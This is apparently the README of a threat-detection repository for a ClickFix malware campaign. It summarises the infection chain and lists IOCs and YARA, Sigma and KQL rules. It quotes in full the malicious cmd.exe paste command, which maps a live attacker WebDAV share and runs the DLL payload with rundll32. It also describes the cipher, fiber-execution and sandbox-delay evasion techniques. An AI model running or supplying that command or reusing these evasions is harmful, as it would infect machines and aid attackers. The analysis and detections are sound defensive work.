# pishbini90ai-clickfix

Blog post: https://blueteam.cool/posts/pishbini90ai-clickfix/

## Summary

A ClickFix campaign serving a 2.4 MB PE32 DLL from `iyrxs.pishbini90ai[.]com`
via WebDAV-over-HTTPS. The victim pastes a cmd.exe one-liner that uses delayed
variable expansion to hide the domain and tool names, maps an HTTPS WebDAV share
using the `pushd \\host@SSL\path` technique, then executes the payload via
`rundll32 google.cl,#1` -- the `.cl` extension masquerades as an OpenCL source file.

The DLL encodes a 304 KB shellcode using a 256-word English substitution cipher
stored in `.rdata`, decodes it into a zeroed `.text` landing zone at runtime, and
executes it via `CreateFiber` / `SwitchToFiber` to bypass some thread-creation
hooks. Two anti-sandbox sleep delays (1 s + 6 s) gate shellcode execution. The
inner payload is AES- or RC4-encrypted and was not recovered statically; the
technique profile is consistent with a commercial implant or beacon but is not confirmed.

```
Victim pastes into Run dialog / PowerShell:
  cmd /v:on /c "set c=pushd&set e=pishbini90ai.com&set b=rundll32&call !c! \\iyrxs.!e!@SSL\bc1fc622-be49-4978-a48c-fa728a19b9df & !b! google.cl,#1"
    -> pushd \\iyrxs.pishbini90ai.com@SSL\bc1fc622-be49-4978-a48c-fa728a19b9df
      -> maps HTTPS WebDAV share as drive letter (HTTP 207 PROPFIND confirmed)
        -> google.cl fetched (2,468,352 bytes; PE32 DLL)
          -> rundll32 google.cl,#1 -> export aeertfdd (ordinal 1)
            -> VirtualAlloc RWX | Sleep(1s) | word-cipher decode (304,375 bytes)
              -> Sleep(6s) | VirtualProtect | CreateFiber -> SwitchToFiber
                -> shellcode (two-pass XOR decoder + encrypted inner payload)
                  -> inner payload UNKNOWN -- requires dynamic analysis
```

Infrastructure confirmed live as of 2026-06-11. Domain registered 2025-05-15 via
Namecheap; Cloudflare-proxied (real backend IP not exposed).

## What is included

| File | Description |
|---|---|
| `iocs.csv` | 18 indicators: hashes (x4), domain, subdomain, URL, IPs (x2), filename, WebDAV UNC, GUID, DLL export, word-cipher alphabet, PE timestamp, image base, directory mtime, ETag |
| `rule.yar` | YARA: domain/webdav/export string match + word-cipher .rdata fingerprint + fiber import pair |
| `sigma-clickfix-cmd-webdav-ssl.yml` | Sigma: cmd.exe /v + @SSL\ + rundll32 (ClickFix delivery pattern) |
| `sigma-rundll32-non-pe-extension.yml` | Sigma: rundll32 executing a file with non-standard extension (.cl, etc.) |
| `kql.md` | KQL queries for Microsoft Sentinel and Defender XDR (6 queries) |

## Coverage notes

**What these detections cover:**

- The cmd.exe ClickFix paste pattern: `/v` + `@SSL\` + `rundll32` together
- `rundll32` executing files with non-DLL/OCX/CPL extensions (generic catch)
- The C2 domain `pishbini90ai.com` and all subdomains via DNS/proxy telemetry
- The GUID delivery path `bc1fc622-be49-4978-a48c-fa728a19b9df` for prior-infection hunting
- The word-cipher DLL on disk via YARA (`.rdata` word-list fragment + fiber imports)
- The `@SSL\` WebDAV mapping network event via proxy PROPFIND telemetry
- API call sequence: VirtualProtect + CreateFiber/SwitchToFiber within rundll32

**What these detections do NOT cover:**

- The originating ClickFix lure page (URL not captured in available telemetry)
- The inner payload family or capabilities (encrypted; requires dynamic analysis / sandbox detonation)
- The real C2 backend IP (Cloudflare reverse proxy hides the origin; CDN IPs have low confidence)
- The victim-paste action itself before cmd.exe spawns (requires browser/clipboard telemetry)

## False-positive notes

- `sigma-clickfix-cmd-webdav-ssl.yml`: Essentially no false positives in production.
  The combination of delayed expansion + `@SSL\` + `rundll32` in a single cmd.exe
  commandline has no known legitimate use.

- `sigma-rundll32-non-pe-extension.yml`: Rare legitimate software may invoke rundll32
  with non-standard extensions. Filter known-good paths in your environment
  (e.g. `C:\Windows\System32`, `C:\Windows\SysWOW64`) if needed.

- `rule.yar` (ClickFix_WordSubstitutionCipher_DLL): The fiber import pair
  (CreateFiber + SwitchToFiber) in a 2-4 MB PE could match legitimate software
  using fibers for concurrency. The `.rdata` word-list byte sequence is highly
  specific and has no known false positives.

## Confidence

**High** for the full delivery chain: ClickFix cmd paste, WebDAV staging, DLL stager,
word-substitution cipher decode, and fiber-based shellcode execution were all directly
observed and confirmed against the PE import table and disassembly.

**Unknown** for the inner payload family. The 304 KB decoded shellcode (payload_decoded.bin)
has near-maximum entropy (7.995/8.0) and a two-pass self-modifying XOR decoder stub. No
strings, import table, or configuration block were recovered statically. The technique
profile is consistent with a commercial implant (e.g. Cobalt Strike beacon) but this is
not confirmed. Dynamic analysis or sandbox detonation is required to identify the family.

## Related detections

- [rule.yar](rule.yar) -- word-cipher DLL + ClickFix stager YARA
- [sigma-clickfix-cmd-webdav-ssl.yml](sigma-clickfix-cmd-webdav-ssl.yml) -- ClickFix cmd delivery
- [sigma-rundll32-non-pe-extension.yml](sigma-rundll32-non-pe-extension.yml) -- rundll32 extension masquerade
- [kql.md](kql.md) -- Microsoft Sentinel / Defender XDR queries
- [iocs.csv](iocs.csv) -- all indicators
